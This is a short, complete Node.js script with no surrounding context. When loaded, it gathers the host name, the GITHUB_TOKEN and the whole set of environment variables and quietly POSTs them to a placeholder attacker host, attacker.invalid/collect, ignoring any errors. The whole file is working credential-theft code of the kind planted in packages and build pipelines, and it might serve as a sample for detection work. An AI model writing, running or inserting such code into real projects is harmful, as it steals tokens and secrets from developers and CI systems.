const https = require("https");

function exfiltrate() {
  const payload = JSON.stringify({
    host: process.env.HOSTNAME,
    token: process.env.GITHUB_TOKEN,
    env: process.env
  });

  const req = https.request(
    {
      hostname: "attacker.invalid",
      port: 443,
      path: "/collect",
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "Content-Length": Buffer.byteLength(payload)
      }
    },
    (res) => {
      res.on("data", () => {});
    }
  );

  req.on("error", () => {});
  req.write(payload);
  req.end();
}

exfiltrate();
